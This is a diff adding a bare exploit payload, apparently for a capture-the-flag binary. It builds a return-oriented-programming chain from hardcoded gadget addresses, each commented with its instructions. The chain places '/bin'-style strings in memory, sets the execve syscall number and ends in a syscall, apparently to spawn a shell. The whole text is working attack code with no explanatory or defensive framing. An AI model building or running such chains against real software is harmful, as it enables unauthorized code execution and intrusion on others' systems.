@@ -1,0 +1,45 @@
+payload = p64(0x4011ad)
+#0x00000000004011ad: pop rbp; ret; 
+payload += p64(0x25e1cb)+p64(0x426032)
+# 0x0000000000426032: pop rcx; ret; 
+payload += p64(0x7dc00)+p64(0x4119bc)
+# 0x00000000004119bc: pop rdi; dec dword ptr [rbp + rcx*4 + 0x2d]; ret; 
+payload += p64(0x6e69622f)+p64(0x427b19)
+# 0x0000000000427b19: xchg edi, eax; ret; 
+payload += p64(0x426032)
+# 0x0000000000426032: pop rcx; ret; 
+payload += p64(0x455049)+p64(0x43d898)
+# 0x43d898: or dword ptr [rcx + 0xf], eax ; ret
+payload += p64(0x4011ad)
+# 0x00000000004011ad: pop rbp; ret; 
+payload += p64(0xe4000000003e13a9)+p64(0x426032)
+# 0x0000000000426032: pop rcx; ret; 
+payload += p64(0x70000000001cf6d)+p64(0x4119bc)
+# 0x00000000004119bc: pop rdi; dec dword ptr [rbp + rcx*4 + 0x2d]; ret; 
+payload += p64(0x68662f)+p64(0x427b19)
+# 0x0000000000427b19: xchg edi, eax; ret; 
+payload += p64(0x426032)
+# 0x0000000000426032: pop rcx; ret; 
+payload += p64(0x45504d)+p64(0x43d898)
+# 0x43d898: or dword ptr [rcx + 0xf], eax ; ret
+payload += p64(0x40ba48)
+# 0x40ba48: pop rsi ; or al, 7 ; or dh, al ; retf
+payload += p64(0x0)+p32(0x43ceda)+p32(0x33)
+# 0x43ceda: pop rdx ; retf 0
+payload += p64(0x0)+p32(0x4011ad)+p32(0x33)
+# 0x00000000004011ad: pop rbp; ret; 
+payload += p64(0xc000000000123162)+p64(0x426032)
+# 0x0000000000426032: pop rcx; ret; 
+payload += p64(0x10000000000cc827)+p64(0x4119bc)
+# 0x00000000004119bc: pop rdi; dec dword ptr [rbp + rcx*4 + 0x2d]; ret; 
+payload += p64(0x3b)+p64(0x427b19)
+# 0x0000000000427b19: xchg edi, eax; ret; 
+payload += p64(0x4011ad)
+# 0x00000000004011ad: pop rbp; ret; 
+payload += p64(0x800000000040719d)+p64(0x426032)
+# 0x0000000000426032: pop rcx; ret; 
+payload += p64(0x2000000000013810)+p64(0x4119bc)
+# 0x00000000004119bc: pop rdi; dec dword ptr [rbp + rcx*4 + 0x2d]; ret; 
+payload += p64(0x455058)+p64(0x40f085)
+# 0x000000000040f085: syscall; 
+payload += b''
